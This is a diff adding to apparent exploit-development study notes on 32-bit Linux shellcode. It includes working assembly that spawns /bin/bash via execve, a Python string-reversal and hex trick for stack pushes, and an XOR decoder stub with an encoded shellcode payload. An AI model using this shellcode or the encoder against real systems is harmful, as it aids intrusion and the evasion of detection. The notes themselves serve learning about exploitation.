@@ -751,3 +751,85 @@ call_shellcode:
 ```
 
 **note** on success execve does NOT return, as such we do not need to exit, further to this on success everything else is overwritten with that of the called program.
+
+Another way to achieve this is by working directly with shellcode, to eliminate needing to find the address:
+```
+section .text
+_start:
+
+	; PUSH the first null dword 
+	xor eax, eax
+	push eax
+
+	; PUSH ////bin/bash (12) 
+	; IN PYTHON SESSION: 
+	; code = '////bin/bash' extra slashes to make up 12 chars (24 bits)
+	; code[::-1].encode('hex') reverse the string and convert to hex
+	; as below we then push on in byte increments (4 chars per push/8bits)
+
+	push 0x68736162
+	push 0x2f6e6962
+	push 0x2f2f2f2f
+
+	mov ebx, esp ; the null and ////bin/bash get moved into ebx
+
+	push eax ; push another null onto stack
+	mov edx, esp ; move the null into edx
+
+	push ebx ; the null and ////bin/bash get pushed back onto stack
+	mov ecx, esp ; they then get moved into ecx
+
+
+	mov al, 11
+	int 0x80
+```
+**when pushing a string onto the stack, in 32bit it needs to be reversed, simplest way to do this is with python.**
+    code = '<your string>'
+    code[::-1]
+Then it needs to be converted to hex, so: 
+    code[::-1].encode('hex')
+Once we have our hex string, we push onto stack in 4byte increments:
+    push 0x0a646c72
+    push 0x6f57206f
+    push 0x6c6c6548
+
+## XOR encoding
+
+easiest way is to encode with a python script, once we have the encoded payload we can decode with the below program:
+```
+global _start			
+
+section .text
+_start:
+
+	jmp short call_decoder ; jmp to decoder, putting address of Shellcode on the stack
+
+decoder:
+	pop esi ; pop Shellcode address into esi
+	xor ecx, ecx ; set ecx to null
+	mov cl, 25 ; set low register on ecx to 25 for our loop
+
+
+decode:
+	xor byte [esi], 0xAA ; xor 1st byte in ESI with 0xAA as key
+	inc esi ; set to esi+1, 2, 3 etc as we iterate through each loop
+	loop decode ; does what it says, until we xor each and every byte in esi
+
+	jmp short Shellcode ; once loop finishes we jump down to shellcode, which has now been decoded and ready for execution
+
+
+
+call_decoder:
+
+	call decoder
+	Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
+```
+#### ALTERNATIVELY you can:
+Add 0xAA to the end of your shellcode and replace decode with the below, it will jmp to execute decoded shellcode once zero gets set
+```
+decode:
+	xor byte [esi], 0xAA
+	jz Shellcode
+	inc esi
+	jmp short decode
+```
